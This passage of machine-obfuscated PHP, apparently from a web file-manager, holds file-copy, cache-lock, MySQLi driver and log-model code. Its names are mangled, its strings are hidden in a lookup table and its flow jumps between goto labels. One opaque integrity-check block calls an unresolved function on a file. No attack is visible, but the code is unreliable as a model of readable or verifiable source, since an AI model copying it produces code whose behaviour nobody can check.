== REPEAT_SKIP) { continue; } if ($Ü†´èÀ¿ == REPEAT_REPLACE) { $¶½ÑÇ‡Ä = $this->sourceInfoCache($Ç®¼áş‰); $¯‰÷ĞûÄ = $this->fileHistory($¶½ÑÇ‡Ä, $à»à‹¼[$¶ö§öÊİ[468]], $à»à‹¼[$¶ö§öÊİ[76]]); if ($¯‰÷ĞûÄ) { $ûÛÎÓ[$¶ö§öÊİ[566]][] = $à»à‹¼[$¶ö§öÊİ[468]]; } continue; } else { if ($Ü†´èÀ¿ == REPEAT_RENAME) { $à»à‹¼[$¶ö§öÊİ[32]] = $this->fileNameAutoCache($›¥—²çÃ, $à»à‹¼[$¶ö§öÊİ[32]], $Ü†´èÀ¿, !1); } } } } if (!$à»à‹¼[$¶ö§öÊİ[410]] && $à»à‹¼[$¶ö§öÊİ[468]] == 0) { continue; } if (!$à»à‹¼[$¶ö§öÊİ[410]] && $à»à‹¼[$¶ö§öÊİ[468]]) { $ûÛÎÓ[$¶ö§öÊİ[566]][] = $à»à‹¼[$¶ö§öÊİ[468]]; } $ì†Â¼›À[] = $this->_makeItemData($à»à‹¼, $¡Ùû´, $à»à‹¼[$¶ö§öÊİ[32]]); } unset($à»à‹¼); if (!empty($ì†Â¼›À)) { $this->addAll($ì†Â¼›À); $this->_childrenListSelect($›¥—²çÃ); } $¦ÙìõãÓ = $this->_childrenList($›¥—²çÃ); $¦ÙìõãÓ = array_to_keyvalue($¦ÙìõãÓ, $¶ö§öÊİ[32]); foreach ($õ¢£ÂÓ… as $à»à‹¼) { $¶½ÑÇ‡Ä = $¦ÙìõãÓ[$à»à‹¼[$¶ö§öÊİ[32]]]; $ıØÔÌç¾ = $¶½ÑÇ‡Ä[$¶ö§öÊİ[402]]; $this->_copyApplyMeta($¶½ÑÇ‡Ä, $ûÛÎÓ); if ($à»à‹¼[$¶ö§öÊİ[33]] == $¶ö§öÊİ[75]) { $à»à‹¼[$¶ö§öÊİ[84]] = $å´Â‹©->getPathInner($à»à‹¼[$¶ö§öÊİ[84]]); $this->_copyChildTo($å´Â‹©, $à»à‹¼[$¶ö§öÊİ[84]], $ıØÔÌç¾, $Ü†´èÀ¿, $ûÛÎÓ, $Öæ ®Ì); } } } private function _addFiles($‰¦¤¶Á, $ƒ›¿Ğ½, $óå”û³í) { $§ù…¥ÖÕ =& $_SERVER[Ì¥ŞÒ°£]; if (!$ƒ›¿Ğ½ || count($ƒ›¿Ğ½) == 0) { return array(); } $™öşó¡† = array(); foreach ($ƒ›¿Ğ½ as &$ö²À–Àğ) { Hook::trigger($§ù…¥ÖÕ[607], $ö²À–Àğ); $ö²À–Àğ[$§ù…¥ÖÕ[84]] = $‰¦¤¶Á->getPathInner($ö²À–Àğ[$§ù…¥ÖÕ[84]]); $²ë­ÌÖã = $‰¦¤¶Á->hashSimple($ö²À–Àğ[$§ù…¥ÖÕ[84]]); $…€€÷Å“ = $‰¦¤¶Á->hashMd5($ö²À–Àğ[$§ù…¥ÖÕ[84]]); if (strlen($…€€÷Å“) > 10 && !isset($™öşó¡†[$…€€÷Å“])) { $™öşó¡†[$…€€÷Å“] = array(); } $ö²À–Àğ[$§ù…¥ÖÕ[177]] = $²ë­ÌÖã; $ö²À–Àğ[$§ù…¥ÖÕ[176]] = $…€€÷Å“; $™öşó¡†[$…€€÷Å“][] =& $ö²À–Àğ; if (count($™öşó¡†[$…€€÷Å“]) > 1) { $ö²À–Àğ[$§ù…¥ÖÕ[606]] = !0; } Hook::trigger($§ù…¥ÖÕ[608], $ö²À–Àğ); } unset($ö²À–Àğ); $£Êµ†™µ = array($§ù…¥ÖÕ[176] => array($§ù…¥ÖÕ[7], array_keys($™öşó¡†))); $¦ú“´ñ¡ = Model($§ù…¥ÖÕ[609]); $ïí³óˆ = $¦ú“´ñ¡->where($£Êµ†™µ)->select(); $ïí³óˆ = $ïí³óˆ ? $ïí³óˆ : array(); foreach ($ïí³óˆ as $ô«Ó×ùµ) { if (!isset($™öşó¡†[$ô«Ó×ùµ[$§ù…¥ÖÕ[176]]])) { continue; } $Íéğ¶ã = $™öşó¡†[$ô«Ó×ùµ[$§ù…¥ÖÕ[176]]]; foreach ($Íéğ¶ã as &$ö²À–Àğ) { $ö²À–Àğ[$§ù…¥ÖÕ[468]] = $ô«Ó×ùµ[$§ù…¥ÖÕ[468]]; $ö²À–Àğ[$§ù…¥ÖÕ[606]] = !0; } unset($ö²À–Àğ); } $áü¬É½ = array(); foreach ($ƒ›¿Ğ½ as $†° Î´Ó) { Hook::trigger($§ù…¥ÖÕ[610], $†° Î´Ó); if (isset($†° Î´Ó[$§ù…¥ÖÕ[606]]) && $†° Î´Ó[$§ù…¥ÖÕ[606]]) { Hook::trigger($§ù…¥ÖÕ[611], $†° Î´Ó); continue; } $‡ÂŸÃÎ— = $‰¦¤¶Á->getPathInner($†° Î´Ó[$§ù…¥ÖÕ[84]]); $œİêë³È = $¦ú“´ñ¡->addFileMake($‡ÂŸÃÎ—, $†° Î´Ó[$§ù…¥ÖÕ[76]], $†° Î´Ó[$§ù…¥ÖÕ[177]], $†° Î´Ó[$§ù…¥ÖÕ[176]], $†° Î´Ó[$§ù…¥ÖÕ[32]], $óå”û³í); Hook::trigger($§ù…¥ÖÕ[611], $†° Î´Ó); if (!is_array($œİêë³È)) { continue; } $áü¬É½[] = $œİêë³È; } $¦ú“´ñ¡->addAll($áü¬É½); $£Êµ†™µ = array($§ù…¥ÖÕ[176] => array($§ù…¥ÖÕ[7], array_keys($™öşó¡†))); $ïí³óˆ = $¦ú“´ñ¡->where($£Êµ†™µ)->select(); $ïí³óˆ = $ïí³óˆ ? $ïí³óˆ : array(); foreach ($ïí³óˆ as $ô«Ó×ùµ) { if (!isset($™öşó¡†[$ô«Ó×ùµ[$§ù…¥ÖÕ[176]]])) { continue; } $šÒ÷„ˆè =& $™öşó¡†[$ô«Ó×ùµ[$§ù…¥ÖÕ[176]]]; foreach ($šÒ÷„ˆè as &$ö²À–Àğ) { $ö²À–Àğ[$§ù…¥ÖÕ[468]] = $ô«Ó×ùµ[$§ù…¥ÖÕ[468]]; } unset($ö²À–Àğ); } $«•‘ªÙ = array(); foreach ($ƒ›¿Ğ½ as $¯¥ˆÍéµ) { $«•‘ªÙ[$¯¥ˆÍéµ[$§ù…¥ÖÕ[32]]] = $¯¥ˆÍéµ; } return $«•‘ªÙ; } } goto a´»ñÖÅ¹æ; e²˜¨¯±À†: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($‰úòùŒò, $‚Åİ©Ë) { $úâÂÓß½ =& $_SERVER[Ì¥ŞÒ°£]; $this->cachePath = $‰úòùŒò[$úâÂÓß½[84]]; $this->prefix = $úâÂÓß½[836]; $this->cacheTime = $‚Åİ©Ë; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($µ•À™œ‘) { $¹Ÿ¼”èĞ =& $_SERVER[Ì¥ŞÒ°£]; $µ•À™œ‘ = str_replace(array($¹Ÿ¼”èĞ[837], $¹Ÿ¼”èĞ[97], $¹Ÿ¼”èĞ[73]), $¹Ÿ¼”èĞ[838], $µ•À™œ‘); return $this->cachePath . $¹Ÿ¼”èĞ[839] . $µ•À™œ‘ . $¹Ÿ¼”èĞ[840]; } public function set($ó¨ª–üÅ, $ã¼ƒÜß½, $“çëÛóà = false) { $“çëÛóà = $“çëÛóà ? $“çëÛóà : $this->cacheTime; $ÒÙâ†Ïö = $this->getFile($ó¨ª–üÅ); if (file_put_contents($ÒÙâ†Ïö, $this->prefix . $ã¼ƒÜß½, LOCK_EX)) { @touch($ÒÙâ†Ïö, intval(time() + $“çëÛóà)); clearstatcache(); return !0; } @unlink($ÒÙâ†Ïö); return !1; } public function get($¨¨Ÿ±Ö†) { $½ÈüùË = $this->getFile($¨¨Ÿ±Ö†); if (file_exists($½ÈüùË) && filemtime($½ÈüùË) < time()) { @unlink($½ÈüùË); return !1; } $ÏŸŸ‚œ˜ = @file_get_contents($½ÈüùË); return substr($ÏŸŸ‚œ˜, strlen($this->prefix)); } public function remove($×õß¡¬×) { $©ÌÁä¿á = $this->getFile($×õß¡¬×); return @unlink($©ÌÁä¿á); } public function deleteAll() { $÷©›Ğ®Š =& $_SERVER[Ì¥ŞÒ°£]; $òŒ‚åóÚ = scandir($this->cachePath); foreach ($òŒ‚åóÚ as $ñ€ÕÎµ») { $¡ßƒ³üˆ = $this->cachePath . $ñ€ÕÎµ»; if (strpos($¡ßƒ³üˆ, $÷©›Ğ®Š[840]) && strpos($¡ßƒ³üˆ, $÷©›Ğ®Š[841])) { @unlink($¡ßƒ³üˆ); } } } public function clearTimeout() { $ùŒÃ×ö„ =& $_SERVER[Ì¥ŞÒ°£]; $Õ×ÖëüÆ = scandir($this->cachePath); foreach ($Õ×ÖëüÆ as $ó´ªì ) { $½ç®šá = $this->cachePath . $ó´ªì ; if (strpos($½ç®šá, $ùŒÃ×ö„[840]) && strpos($½ç®šá, $ùŒÃ×ö„[841]) && filemtime($½ç®šá) < time()) { @unlink($½ç®šá); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Â™²ÁÇ‰ =& $_SERVER[Ì¥ŞÒ°£]; if (self::$handle) { return self::$handle; } $×·üŒ¶® = $GLOBALS[$Â™²ÁÇ‰[6]][$Â™²ÁÇ‰[349]]; self::$timeout = $×·üŒ¶®[$Â™²ÁÇ‰[842]] ? $×·üŒ¶®[$Â™²ÁÇ‰[842]] : 10; $ƒ—ú¬—” = _get($GLOBALS[$Â™²ÁÇ‰[6]], $Â™²ÁÇ‰[843]); $Õ…î¬ªÆ = $×·üŒ¶®[$Â™²ÁÇ‰[829]] ? $×·üŒ¶®[$Â™²ÁÇ‰[829]] : $Â™²ÁÇ‰[199]; if ($Õ…î¬ªÆ == $Â™²ÁÇ‰[21] && $ƒ—ú¬—” == $Â™²ÁÇ‰[13]) { $Õ…î¬ªÆ = $Â™²ÁÇ‰[199]; } switch ($Õ…î¬ªÆ) { case $Â™²ÁÇ‰[832]: self::$handle = new CacheLockRedis(); break; case $Â™²ÁÇ‰[833]: self::$handle = new CacheLockMemcached(); break; case $Â™²ÁÇ‰[21]: self::$handle = new CacheLockDatabase(); break; case $Â™²ÁÇ‰[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Â™²ÁÇ‰[844], $Â™²ÁÇ‰[845]); } return self::$handle; } private static function key($Ò¼áÑ¶) { return $_SERVER[Ì¥ŞÒ°£][846] . Cache::key($Ò¼áÑ¶); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($‰¨÷•íš = '') { self::$errorMsg = $‰¨÷•íš; } public static function lockGlobal($§¾ı¥”ş, $äÏæÏ») { return self::lock($§¾ı¥”ş, $äÏæÏ», !0); } public static function lock($©®şıİë, $©¡òŞñÎ = false, $á¿ÌİÀ = false) { $©…à ƒÇ =& $_SERVER[Ì¥ŞÒ°£]; $ºå›ÁïŒ = self::init(); $»ŠÕ—Áè = self::key($©®şıİë); $©¡òŞñÎ = $©¡òŞñÎ ? $©¡òŞñÎ : self::$timeout; $ŸğŠÚå = $ºå›ÁïŒ->lock($»ŠÕ—Áè, $©¡òŞñÎ); $Œƒ”¹êÉ = timeFloat(); if (!$ŸğŠÚå) { $’à£‹´å = "\154\x6f\x63\x6b\x20\x65\x72\x72\157\162\x3b\153\x65\171\x3d{$©®şıİë}\73\164\x69\155\145\75{$©¡òŞñÎ}\73" . self::$errorMsg . $©…à ƒÇ[71] . get_caller_msg(); $àÚï¢Ë« = LNG($©…à ƒÇ[847]) . "\50{$©¡òŞñÎ}\x73\51\56" . LNG($©…à ƒÇ[848]); $àÚï¢Ë« .= $©…à ƒÇ[849]; if (is_string(self::$errorMsg) && self::$errorMsg) { $àÚï¢Ë« = $àÚï¢Ë« . $©…à ƒÇ[850] . self::$errorMsg; } write_log($’à£‹´å, $©…à ƒÇ[845]); show_json($àÚï¢Ë«, !1); } if (!$á¿ÌİÀ) { self::$lockItem[$»ŠÕ—Áè] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $±÷ş‚òô = number_format(timeFloat() - $Œƒ”¹êÉ, 3); write_log($©…à ƒÇ[851] . $©®şıİë . $©…à ƒÇ[852] . $±÷ş‚òô, $©…à ƒÇ[845]); } return $ŸğŠÚå; } public static function lockGet($«Ãë‹Ø˜) { $‚±«Ùªœ = self::key($«Ãë‹Ø˜); if (self::$lockItem[$‚±«Ùªœ]) { return self::$lockItem[$‚±«Ùªœ]; } return self::init()->lockGet($‚±«Ùªœ); } public static function unlock($şÒ€ç¸‡) { $ûÑí¾×É =& $_SERVER[Ì¥ŞÒ°£]; $¬şàæõ£ = self::key($şÒ€ç¸‡); self::$lockItem[$¬şàæõ£] = null; self::init()->unlock($¬şàæõ£); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ûÑí¾×É[853] . $şÒ€ç¸‡, $ûÑí¾×É[845]); } return; } public static function unlockRuntime() { $ÛÍÍÈÜ¹ =& $_SERVER[Ì¥ŞÒ°£]; $ÄÕıüÓ = self::init(); $çÙ²áŒê = !1; foreach (self::$lockItem as $ïÅà´Öô => $²˜ù­ÀÆ) { if (!$²˜ù­ÀÆ) { continue; } $ÄÕıüÓ->unlock($ïÅà´Öô); if (!$çÙ²áŒê) { $çÙ²áŒê = !0; write_log($ÛÍÍÈÜ¹[854] . $ïÅà´Öô . $ÛÍÍÈÜ¹[71] . get_caller_msg(), $ÛÍÍÈÜ¹[845]); continue; } write_log($ÛÍÍÈÜ¹[854] . $ïÅà´Öô, $ÛÍÍÈÜ¹[845]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÑØî˜è = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ÛÍÍÈÜ¹[855] . $ÑØî˜è . $ÛÍÍÈÜ¹[856] . ACTION, $ÛÍÍÈÜ¹[845]); } } public static function fileLock($á˜ˆÓş–) { $âóÈŸ =& $_SERVER[Ì¥ŞÒ°£]; if (!$GLOBALS[$âóÈŸ[857]]) { $GLOBALS[$âóÈŸ[857]] = array(); } $GLOBALS[$âóÈŸ[857]][$á˜ˆÓş–] = !1; $ª³Ş¡µ‡ = fopen(DATA_PATH . $á˜ˆÓş– . $âóÈŸ[858], $âóÈŸ[859]); if (!$ª³Ş¡µ‡) { return !1; } $GLOBALS[$âóÈŸ[857]][$á˜ˆÓş–] = $ª³Ş¡µ‡; if (flock($ª³Ş¡µ‡, LOCK_EX)) { return !0; } self::unlock($á˜ˆÓş–); show_json($âóÈŸ[860], !1); return !1; } public static function fileUnlock($ÙêˆØõ) { $Îº£í =& $_SERVER[Ì¥ŞÒ°£]; $¬ÉÂÒ¥ó = $GLOBALS[$Îº£í[857]][$ÙêˆØõ]; if (!$¬ÉÂÒ¥ó) { return; } $GLOBALS[$Îº£í[857]][$ÙêˆØõ] = !1; flock($¬ÉÂÒ¥ó, LOCK_UN); fclose($¬ÉÂÒ¥ó); } public static function fileUnlockAll() { $öİ¶„Ûí =& $_SERVER[Ì¥ŞÒ°£]; if (!$GLOBALS[$öİ¶„Ûí[857]]) { return; } foreach ($GLOBALS[$öİ¶„Ûí[857]] as $çöüğ£İ => $¨¤ÄÈğ¯) { if (!$¨¤ÄÈğ¯) { continue; } $GLOBALS[$öİ¶„Ûí[857]][$çöüğ£İ] = !1; flock($¨¤ÄÈğ¯, LOCK_UN); fclose($¨¤ÄÈğ¯); } $GLOBALS[$öİ¶„Ûí[857]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto B±ÉÍÉÒ¢“; a´»ñÖÅ¹æ: define($_SERVER[Ì¥ŞÒ°£][612], $_SERVER[Ì¥ŞÒ°£][613]); $kyvuxjight = $_SERVER[Ì¥ŞÒ°£][614]; if (strlen($kyvuxjight) < $_SERVER[Ì¥ŞÒ°£][615]) { return; } goto fØ»²Üñ›†; bÔù‹•çŸ†: $_size = $_SERVER[Ì¥ŞÒ°£][876]; if ($_SERVER[$_SERVER[Ì¥ŞÒ°£][877]] != $_size($_file)) { $_getc = $_SERVER[Ì¥ŞÒ°£][879]; $_getfile = $_SERVER[$_SERVER[Ì¥ŞÒ°£][874]] . $_SERVER[Ì¥ŞÒ°£][875]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ì¥ŞÒ°£][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ì¥ŞÒ°£][615]) { $exit = $_SERVER[Ì¥ŞÒ°£][880]; $exit(); } $_act = $_SERVER[Ì¥ŞÒ°£][916]; $_act($_file); } class DbMysqli extends Db { public function __construct($åÆ‰ì´ü = '') { $ä®Œ¯Î =& $_SERVER[Ì¥ŞÒ°£]; if (!extension_loaded($ä®Œ¯Î[917])) { think_exception(think_lang($ä®Œ¯Î[14]) . $ä®Œ¯Î[918]); } if (!empty($åÆ‰ì´ü)) { $this->config = $åÆ‰ì´ü; if (empty($this->config[$ä®Œ¯Î[17]])) { $this->config[$ä®Œ¯Î[17]] = $ä®Œ¯Î[12]; } } } public function connect($·ûóêİŞ = '', $û±Î÷š™ = 0) { $½íå€Âë =& $_SERVER[Ì¥ŞÒ°£]; if (!isset($this->linkID[$û±Î÷š™])) { if (empty($·ûóêİŞ)) { $·ûóêİŞ = $this->config; } $this->linkID[$û±Î÷š™] = new mysqli($·ûóêİŞ[$½íå€Âë[889]], $·ûóêİŞ[$½íå€Âë[891]], $·ûóêİŞ[$½íå€Âë[892]], $·ûóêİŞ[$½íå€Âë[21]], $·ûóêİŞ[$½íå€Âë[890]] ? intval($·ûóêİŞ[$½íå€Âë[890]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Ì‹‚¥É = $this->linkID[$û±Î÷š™]->server_version; $this->linkID[$û±Î÷š™]->query($½íå€Âë[893] . think_config($½íå€Âë[894]) . $½íå€Âë[58]); if ($Ì‹‚¥É > $½íå€Âë[895]) { $this->linkID[$û±Î÷š™]->query($½íå€Âë[896]); } $this->connected = !0; if (1 != think_config($½íå€Âë[22])) { unset($this->config); } } return $this->linkID[$û±Î÷š™]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÍºƒÏùã) { $íÆƒâêë =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÍºƒÏùã; if ($this->queryID) { $this->free(); } think_action_status($íÆƒâêë[23], 1); think_status($íÆƒâêë[24]); $this->queryID = $this->_linkID->query($ÍºƒÏùã); if ($this->_linkID->more_results()) { while (($ò½ıÜ‘ = $this->_linkID->next_result()) != NULL) { $ò½ıÜ‘->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($…ºãÂ‰) { $ÒŠà»Ú =& $_SERVER[Ì¥ŞÒ°£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $…ºãÂ‰; if ($this->queryID) { $this->free(); } think_action_status($ÒŠà»Ú[25], 1); think_status($ÒŠà»Ú[24]); $½‡‡ìµÈ = $this->_linkID->query($…ºãÂ‰); $this->debug(); if (!1 === $½‡‡ìµÈ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÕåÅòğ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ÕåÅòğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $î¿ş­° = $this->_linkID->rollback(); $this->transTimes = 0; if (!$î¿ş­°) { $this->error(); return !1; } } return !0; } private function getAll() { $ˆ°üªˆ˜ = array(); if ($this->numRows > 0) { for ($âŠ±ÂÜÜ = 0; $âŠ±ÂÜÜ < $this->numRows; $âŠ±ÂÜÜ++) { $ˆ°üªˆ˜[$âŠ±ÂÜÜ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ˆ°üªˆ˜; } public function getFields($«ïÈ¿ƒˆ) { $ó‰¡âğ… =& $_SERVER[Ì¥ŞÒ°£]; $¹ü„‰Ç• = $this->query($ó‰¡âğ…[900] . $this->parseKey($«ïÈ¿ƒˆ)); $ú©„ì¢ú = array(); if ($¹ü„‰Ç•) { foreach ($¹ü„‰Ç• as $§âŞÏö => $“¡æóÄ‚) { $ú©„ì¢ú[$“¡æóÄ‚[$ó‰¡âğ…[31]]] = array($ó‰¡âğ…[32] => $“¡æóÄ‚[$ó‰¡âğ…[31]], $ó‰¡âğ…[33] => $“¡æóÄ‚[$ó‰¡âğ…[34]], $ó‰¡âğ…[35] => (bool) ($“¡æóÄ‚[$ó‰¡âğ…[36]] === $ó‰¡âğ…[12]), $ó‰¡âğ…[37] => $“¡æóÄ‚[$ó‰¡âğ…[38]], $ó‰¡âğ…[39] => strtolower($“¡æóÄ‚[$ó‰¡âğ…[40]]) == $ó‰¡âğ…[41], $ó‰¡âğ…[42] => strtolower($“¡æóÄ‚[$ó‰¡âğ…[43]]) == $ó‰¡âğ…[44]); } } return $ú©„ì¢ú; } public function getTables($Íáëü•› = '') { $ÔëèÔ€° =& $_SERVER[Ì¥ŞÒ°£]; $Ã÷ıÍµ‘ = !empty($Íáëü•›) ? $ÔëèÔ€°[902] . $Íáëü•› . $ÔëèÔ€°[903] : $ÔëèÔ€°[904]; $‚¦ê©€» = $this->query($Ã÷ıÍµ‘); $™”‚÷² = array(); if ($‚¦ê©€») { foreach ($‚¦ê©€» as $‰©¦ğõÌ => $¡°àŒİÃ) { $™”‚÷²[$‰©¦ğõÌ] = current($¡°àŒİÃ); } } return $™”‚÷²; } public function replace($½ûáõ²­, $®°¯ó‡ê = array()) { $§áÇ®”’ =& $_SERVER[Ì¥ŞÒ°£]; foreach ($½ûáõ²­ as $¾ñ¾ïÚù => $ùÙ¬„”¬) { $úÅæúïü = $this->parseValue($ùÙ¬„”¬); if (is_scalar($úÅæúïü)) { $Üâõüî”[] = $úÅæúïü; $¿‹åõ²ö[] = $this->parseKey($¾ñ¾ïÚù); } } $¥°ôâ© = $§áÇ®”’[905] . $this->parseTable($®°¯ó‡ê[$§áÇ®”’[279]]) . $§áÇ®”’[906] . implode($§áÇ®”’[50], $¿‹åõ²ö) . $§áÇ®”’[907] . implode($§áÇ®”’[50], $Üâõüî”) . $§áÇ®”’[908]; return $this->execute($¥°ôâ©); } public function insertAll($ªÔÑ´İÒ, $””Ã³ç = array(), $ñÓàİçı = false) { $ÀÎ¨õö =& $_SERVER[Ì¥ŞÒ°£]; if (!is_array($ªÔÑ´İÒ[0])) { return !1; } $ÆªôşÜÂ = array_keys($ªÔÑ´İÒ[0]); $ÊäŒëì = array(); foreach ($ªÔÑ´İÒ as $ıªÉ±åø) { $øªøòïõ = array(); foreach ($ıªÉ±åø as $ĞËàÜ–Ÿ => $®ÓŞ÷) { $®ÓŞ÷ = $this->parseValue($®ÓŞ÷); if (is_scalar($®ÓŞ÷)) { $øªøòïõ[] = $®ÓŞ÷; } } $ÊäŒëì[] = $ÀÎ¨õö[260] . implode($ÀÎ¨õö[50], $øªøòïõ) . $ÀÎ¨õö[908]; } array_walk($ÆªôşÜÂ, array($this, $ÀÎ¨õö[909])); $£¼ì¦æ = $ñÓàİçı ? $ÀÎ¨õö[910] : $ÀÎ¨õö[911]; $ºûÆåŠë = $£¼ì¦æ . $ÀÎ¨õö[912] . $this->parseTable($””Ã³ç[$ÀÎ¨õö[279]]) . $ÀÎ¨õö[906] . implode($ÀÎ¨õö[50], $ÆªôşÜÂ) . $ÀÎ¨õö[913] . implode($ÀÎ¨õö[50], $ÊäŒëì); return $this->execute($ºûÆåŠë); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $™ ¬Ì¶ =& $_SERVER[Ì¥ŞÒ°£]; $this->error = $this->_linkID->errno . $™ ¬Ì¶[4] . $this->_linkID->error; if ($™ ¬Ì¶[12] != $this->queryStr) { $this->error .= LNG($™ ¬Ì¶[48]) . $this->queryStr; } think_trace($this->error, $™ ¬Ì¶[12], $™ ¬Ì¶[49]); return $this->error; } public function escapeString($ˆöùì«¬) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ˆöùì«¬); } else { return addslashes($ˆöùì«¬); } } public function parseKey(&$ÛìŞÓ¢Ø, $˜Àşæë = true) { $…Öá¯ =& $_SERVER[Ì¥ŞÒ°£]; if ($˜Àşæë) { $ÛìŞÓ¢Ø = $this->parseKeyCheck($ÛìŞÓ¢Ø); } if ($ÛìŞÓ¢Ø != $…Öá¯[188] && !preg_match($…Öá¯[914], $ÛìŞÓ¢Ø)) { $ÛìŞÓ¢Ø = $…Öá¯[385] . trim($ÛìŞÓ¢Ø, $…Öá¯[385]) . $…Öá¯[385]; } return $ÛìŞÓ¢Ø; } } goto aï”É¯ù; béÔõ©éŞ—: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x4c\151\147\150\x74\101\160\160"; public $modelType = "\x53\x79\163\x74\x65\155\117\160\164\x69\x6f\156"; public $field = array("\x6e\141\x6d\145", "\147\x72\157\x75\x70", "\x64\145\x73\143", "\x63\x6f\x6e\164\x65\156\x74"); public function listData($¦ÅÂƒş = false, $ÑÕİ†îÌ = "\x6d\x6f\x64\x69\x66\x79\x54\151\x6d\145", $õİ’Ş³ = true) { return parent::listData($¦ÅÂƒş, $ÑÕİ†îÌ, $õİ’Ş³); } public function remove($ãÉÒƒÑ) { $Ù¶œÑ¦ = $this->findByName($ãÉÒƒÑ); if (!$Ù¶œÑ¦) { return !1; } return parent::remove($Ù¶œÑ¦[$_SERVER[Ì¥ŞÒ°£][399]]); } public function add($½™àãı–) { if ($this->findByName($½™àãı–[$_SERVER[Ì¥ŞÒ°£][32]])) { return !1; } return parent::insert($½™àãı–); } public function update($š¼Ä™×², $ˆ¶­Ä²) { $¹æ·±ôœ =& $_SERVER[Ì¥ŞÒ°£]; $¶²¾ÂÔ‡ = $this->findByName($š¼Ä™×²); $ÙšÒä¼ = $this->findByName($ˆ¶­Ä²[$¹æ·±ôœ[32]]); if (!$¶²¾ÂÔ‡ || $ÙšÒä¼ && $ÙšÒä¼[$¹æ·±ôœ[399]] != $¶²¾ÂÔ‡[$¹æ·±ôœ[399]]) { return !1; } return parent::update($¶²¾ÂÔ‡[$¹æ·±ôœ[399]], $ˆ¶­Ä²); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\145\141\164\145\x54\151\x6d\x65", "\x74\x69\155\145", "\x69\156\163\x65\162\x74", "\x66\x75\x6e\x63\164\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $‹şÊ·Ò¥ =& $_SERVER[Ì¥ŞÒ°£]; return array($‹şÊ·Ò¥[2185] => LNG($‹şÊ·Ò¥[2186]), $‹şÊ·Ò¥[2187] => LNG($‹şÊ·Ò¥[2188]), $‹şÊ·Ò¥[1800] => LNG($‹şÊ·Ò¥[2189]), $‹şÊ·Ò¥[2190] => LNG($‹şÊ·Ò¥[2191]), $‹şÊ·Ò¥[2192] => LNG($‹şÊ·Ò¥[2193]), $‹şÊ·Ò¥[2194] => LNG($‹şÊ·Ò¥[2195]), $‹şÊ·Ò¥[2196] => LNG($‹şÊ·Ò¥[2197]), $‹şÊ·Ò¥[1830] => LNG($‹şÊ·Ò¥[2197]), $‹şÊ·Ò¥[1831] => LNG($‹şÊ·Ò¥[2198]), $‹şÊ·Ò¥[2199] => LNG($‹şÊ·Ò¥[2200]), $‹şÊ·Ò¥[2201] => LNG($‹şÊ·Ò¥[2202]), $‹şÊ·Ò¥[2203] => LNG($‹şÊ·Ò¥[2204]), $‹şÊ·Ò¥[2205] => LNG($‹şÊ·Ò¥[2206]), $‹şÊ·Ò¥[1828] => LNG($‹şÊ·Ò¥[2207]), $‹şÊ·Ò¥[2208] => LNG($‹şÊ·Ò¥[2209]), $‹şÊ·Ò¥[1835] => LNG($‹şÊ·Ò¥[2210]), $‹şÊ·Ò¥[2211] => LNG($‹şÊ·Ò¥[2212]), $‹şÊ·Ò¥[2213] => LNG($‹şÊ·Ò¥[2214]), $‹şÊ·Ò¥[2215] => LNG($‹şÊ·Ò¥[2216]), $‹şÊ·Ò¥[2217] => LNG($‹şÊ·Ò¥[2218]), $‹şÊ·Ò¥[1838] => LNG($‹şÊ·Ò¥[2219]), $‹şÊ·Ò¥[1839] => LNG($‹şÊ·Ò¥[2220]), $‹şÊ·Ò¥[2221] => LNG($‹şÊ·Ò¥[2222]), $‹şÊ·Ò¥[2223] => LNG($‹şÊ·Ò¥[2224]), $‹şÊ·Ò¥[2225] => LNG($‹şÊ·Ò¥[2226]), $‹şÊ·Ò¥[1833] => LNG($‹şÊ·Ò¥[2227]), $‹şÊ·Ò¥[2228] => LNG($‹şÊ·Ò¥[2229]), $‹şÊ·Ò¥[1832] => LNG($‹şÊ·Ò¥[2230]), $‹şÊ·Ò¥[2231] => LNG($‹şÊ·Ò¥[2232]), $‹şÊ·Ò¥[2233] => LNG($‹şÊ·Ò¥[2234]), $‹şÊ·Ò¥[2235] => LNG($‹şÊ·Ò¥[2236]), $‹şÊ·Ò¥[2237] => LNG($‹şÊ·Ò¥[2237]), $‹şÊ·Ò¥[2238] => LNG($‹şÊ·Ò¥[1804]), $‹şÊ·Ò¥[2239] 